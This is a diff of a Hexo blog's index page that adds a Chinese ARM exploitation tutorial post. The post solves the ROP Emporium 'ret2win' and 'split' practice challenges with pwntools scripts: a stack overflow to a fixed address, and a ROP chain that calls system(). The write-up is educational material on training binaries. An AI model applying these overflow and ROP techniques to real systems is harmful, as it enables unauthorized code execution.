@@ -150,6 +150,117 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-3/" class="post-title-link" itemprop="url">ARM pwn 入门 (3)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 22:02:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:02:00+08:00">2023-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:30:22" itemprop="dateModified" datetime="2023-03-01T11:30:22+08:00">2023-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ARM-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">ARM pwn 系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>2 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><font face=汉仪唐美人>由于网上的ARM pwn题很少很难找，因此这里拿ROP Emporium的8道题做练习，这个<a target="_blank" rel="noopener" href="https://ropemporium.com/">网站</a>有包含x86-64、x86-32、MIPS、ARM共4种架构的elf文件可以做。</font></p>
+<h1 id="font-face汉仪唐美人1-ret2winfont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人1-ret2winfont"></a> <font face=汉仪唐美人>1. ret2win</font></h1>
+<p><font color=ff0000, face=汉仪唐美人>注意：在执行需要动态链接库加载的ARM elf文件时，如果直接使用<code>qemu-arm xxx</code>有可能会报错：<code>/lib/ld-linux.so.3: No such file or directory</code>。解决方法：安装arm交叉编译包<code>apt install gcc-arm-linux-gnueabi</code>，找到交叉编译包的lib地址（一般都是<code>/usr/arm-linux-gnueabi</code>），在命令后添加<code>-L /usr/arm-linux-gnueabi</code>即可。</font></p>
+<p><img src="1.png" alt="" /><br />
+<font face=汉仪唐美人>这是一道最为简单的栈溢出，ret2text。为了熟悉ARM指令，我们从汇编层面进行分析。</font></p>
+<p><font face=汉仪唐美人>可以看到，在ARM的函数调用规则中，参数的赋值顺序是从右到左，如下方<code>BL</code>指令调用<code>read</code>函数前，首先将第3个参数<code>nbytes</code>赋值给<code>R2</code>寄存器。在<code>pwnme</code>函数开头有一个<code>PUSH</code>指令，这里的<code>R11</code>可以看做是<code>rbp</code>，<code>LR</code>是函数返回值，在函数开头这两个寄存器基本都是要入栈的。然后保存<code>R11</code>的值作为栈帧的标记，<code>SP</code>下移留出栈空间。这就是函数开头需要完成的工作，与x86-64架构如出一辙。</font></p>
+<p><font face=汉仪唐美人>下面看到<code>read</code>函数的调用部分。第二个参数<code>R1</code>的值为<code>R11-0x24</code>，由于<code>R11</code>在往上就是返回地址，因此要修改返回地址，应该先写入0x24长度的无效字节，然后写后门函数的返回地址。</font></p>
+<p><font face=汉仪唐美人>最后看一下函数即将返回之前需要完成的工作。首先恢复<code>SP</code>为<code>R11-4</code>，然后<code>R11</code>出栈，<code>PC</code>出栈。在正常情况下，这里的<code>R11</code>出栈后应该指向父函数的栈空间顶端。现在我们进行了栈溢出，修改了这里的值，<code>R11</code>就无效了。</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">0x24</span>) + p32(<span class="number">0x105ec</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="font-face汉仪唐美人2-splitfont"><a class="markdownIt-Anchor" href="#font-face汉仪唐美人2-splitfont"></a> <font face=汉仪唐美人>2. split</font></h1>
+<p><img src="2.png" alt="" /><br />
+<img src="3.png" alt="" /></p>
+<p><font face=汉仪唐美人>这里有一个有用的字符串和一个后门函数，只不过这个后门函数不能让我们拿到shell，很自然的想法就是调用system函数，参数改成那个字符串的地址。</font></p>
+<p><font face=汉仪唐美人>由于该elf文件的加载地址固定，我们就直接在elf文件中寻找可用的gadget。</font></p>
+<p><img src="4.png" alt="" /></p>
+<p><font face=汉仪唐美人>不同于x86-64架构，ARM架构下的gadget似乎要更少一些。如上图所示，只用<code>pop</code>指令的gadget中没有能够<code>pop r0</code>的，我们只能扩大范围进行查找：</font></p>
+<p><img src="https://img-blog.csdnimg.cn/a33eaa7d29b040aabdef96c34b83c98f.png" alt="在这里插入图片描述" /></p>
+<p><font face=汉仪唐美人>于是我们找到了这个gadget，它可以和上面的<code>pop &#123;r3, pc&#125;</code>连接起来，首先修改<code>r3</code>的值，再修改<code>r0</code>的值即可。于是我们的exp呼之欲出：</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./split_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">popr3pc = <span class="number">0x103a4</span></span><br><span class="line">movr0r3_popfppc = <span class="number">0x10558</span></span><br><span class="line">shellstr = <span class="number">0x2103c</span></span><br><span class="line">callsystem = <span class="number">0x105e0</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">0x24</span>) + p32(popr3pc) + p32(shellstr) + p32(movr0r3_popfppc) + p32(<span class="number">0</span>) + p32(callsystem))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><font face=汉仪唐美人>PS：本来想发三道题的，但是这周末比赛打的太累了，第三题就留到后面一篇文章发了，还请谅解。</font></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -562,7 +673,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">142</span>
+          <span class="site-state-item-count">143</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -620,7 +731,7 @@
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">19:07</span>
+    <span title="Reading time total">19:16</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
